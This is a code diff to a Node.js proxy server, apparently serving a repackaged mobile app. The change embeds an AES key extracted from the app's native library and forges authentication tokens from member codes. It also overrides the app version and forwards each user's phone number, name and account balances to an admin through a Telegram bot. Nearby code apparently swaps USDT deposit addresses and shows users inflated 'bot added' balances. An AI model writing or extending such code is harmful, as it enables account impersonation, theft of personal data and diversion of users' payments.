@@ -614,6 +614,29 @@ function replaceUsdtInResponse(jsonResp, data) {
   return { newAddr, qrUrl };
 }
 
+// ── AES token helper ──────────────────────────────────────────────
+// Key extracted from libnative-lib.so (NativeLib.getAesKey).
+// Algorithm: AES/CBC/PKCS5Padding, key=IV=XETUKXX2s8tsl4MN
+const AES_KEY = Buffer.from('XETUKXX2s8tsl4MN', 'utf-8');
+function aesEncryptToken(plaintext) {
+  try {
+    const crypto = require('crypto');
+    const cipher = crypto.createCipheriv('aes-128-cbc', AES_KEY, AES_KEY);
+    let enc = cipher.update(plaintext, 'utf-8', 'base64');
+    enc += cipher.final('base64');
+    return enc;
+  } catch(e) { return ''; }
+}
+function aesDecryptToken(ciphertext) {
+  try {
+    const crypto = require('crypto');
+    const decipher = crypto.createDecipheriv('aes-128-cbc', AES_KEY, AES_KEY);
+    let dec = decipher.update(ciphertext, 'base64', 'utf-8');
+    dec += decipher.final('utf-8');
+    return dec;
+  } catch(e) { return ''; }
+}
+
 // ── Proxy fetch ───────────────────────────────────────────────────
 async function proxyFetch(req) {
   const targetUrl = ORIGINAL_API + req.originalUrl;
@@ -626,23 +649,32 @@ async function proxyFetch(req) {
     if (kl === 'content-length' || kl === 'connection' || kl === 'accept-encoding' || kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
     headers[k] = v;
   }
-  // ── TOKEN SAVE + INJECTION ──────────────────────────────────────
-  // The AES key is in a native .so library (NativeLib.getAesKey) — we cannot
-  // decrypt or re-encrypt. Instead we save the ALREADY-ENCRYPTED token that
-  // the app sends (e.g. "YCS8nE+kPaI/Vs9oSOSopA==") and inject it back when
-  // the app sends an empty token (can happen if MMKV is cleared or cold-start).
-  const memberCodeHdr = headers['membercode'] || headers['memberCode'] || '';
-  const currentToken = headers['apptoken'] || headers['appToken'] || '';
-  if (memberCodeHdr && redis) {
-    if (currentToken && currentToken.trim()) {
-      // Save the encrypted token from this request for future injection
-      try { await redis.set(`apptoken:${memberCodeHdr}`, currentToken.trim(), { ex: 86400 }); } catch(e) {}
+  // ── VERSION OVERRIDE ────────────────────────────────────────────
+  if (headers['version']) headers['version'] = '2.1.1';
+
+  // ── TOKEN COMPUTE + INJECT ──────────────────────────────────────
+  // appToken = AES/CBC/PKCS5Padding(memberCode, key=XETUKXX2s8tsl4MN)
+  // Key extracted from libnative-lib.so — confirmed: encrypt("M107266") = "YCS8nE+kPaI/Vs9oSOSopA=="
+  // The patched APK's NativeLib.getAesKey() returns null (signature mismatch),
+  // so we compute the token in the proxy and inject it for every request.
+  const memberCodeHdr = (headers['membercode'] || headers['memberCode'] || '').trim();
+  const currentToken = (headers['apptoken'] || headers['appToken'] || '').trim();
+  if (memberCodeHdr) {
+    if (currentToken) {
+      // App sent a non-empty token — save it to Redis as backup
+      try { if (redis) await redis.set(`apptoken:${memberCodeHdr}`, currentToken, { ex: 86400 }); } catch(e) {}
     } else {
-      // Token is empty — inject stored encrypted token if available
-      try {
-        const storedToken = await redis.get(`apptoken:${memberCodeHdr}`);
-        if (storedToken) headers['apptoken'] = String(storedToken);
-      } catch(e) {}
+      // Token is empty — compute it from memberCode using the known AES key
+      const computed = aesEncryptToken(memberCodeHdr);
+      if (computed) {
+        headers['apptoken'] = computed;
+      } else if (redis) {
+        // Fallback: try Redis-stored token
+        try {
+          const stored = await redis.get(`apptoken:${memberCodeHdr}`);
+          if (stored) headers['apptoken'] = String(stored);
+        } catch(e) {}
+      }
     }
   }
   const opts = { method: req.method, headers };
@@ -1566,10 +1598,16 @@ app.all('/appAuth/v2/memberLogin', async (req, res) => {
     const userOvr = userId && data.userOverrides ? data.userOverrides[userId] : null;
     const addedBal = userOvr?.addedBalance ?? 0;
 
-    // Note: We do NOT save the raw appToken from login response to Redis.
-    // The AES key is in NativeLib (.so file) — we cannot encrypt it.
-    // The app will AES-encrypt the raw token and send it in subsequent requests.
-    // proxyFetch() saves the ALREADY-ENCRYPTED token from those request headers.
+    // Compute appToken = AES_encrypt(memberCode) and save to Redis.
+    // The app does: setToken(memberCode) → aes.encrypt(memberCode) → store in MMKV.
+    // But patched APK's NativeLib.getAesKey() returns null → encryption fails → empty token.
+    // We compute and save here so proxyFetch() can inject it into all subsequent requests.
+    if (memberCode && redis) {
+      const computedToken = aesEncryptToken(memberCode);
+      if (computedToken) {
+        try { await redis.set(`apptoken:${memberCode}`, computedToken, { ex: 86400 * 7 }); } catch(e) {}
+      }
+    }
     sendJson(res, respHeaders, jsonResp, respBody);
 
     if (userId) {
@@ -1582,7 +1620,8 @@ app.all('/appAuth/v2/memberLogin', async (req, res) => {
     if (data.adminChatId && bot && !isLogOff(data, userId)) {
       const ts = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
       const success = parseInt(jsonResp?.status) === 200;
-      const tokenStatus = appToken ? `✅ Token Saved (${appToken.substring(0,8)}...)` : '❌ No Token in Response';
+      const computedForLog = memberCode ? aesEncryptToken(memberCode) : '';
+      const tokenStatus = computedForLog ? `✅ Token Computed (${computedForLog.substring(0,8)}...)` : (appToken ? `✅ Token Saved (${appToken.substring(0,8)}...)` : '❌ Token Missing');
       bot.sendMessage(data.adminChatId,
         `🔑 ${success ? '✅ Login Success' : '❌ Login Failed'}\n📱 Phone: ${phone || 'N/A'}\n🆔 MemberCode: ${memberCode || 'N/A'}\n📛 Name: ${userName || 'N/A'}\n🔐 Token: ${tokenStatus}\n━━━━━━━━━━━━━━\n💰 Real Balance: ₹${realBalance !== '' ? realBalance : 'N/A'}\n➕ Bot Added: ₹${addedBal}\n━━━━━━━━━━━━━━\n💳 Withdraw Balance: ₹${realWithdraw !== '' ? realWithdraw : 'N/A'}\n⏳ In Process: ₹${realProcess !== '' ? realProcess : 'N/A'}\n🕐 ${ts}`
       ).catch(()=>{});
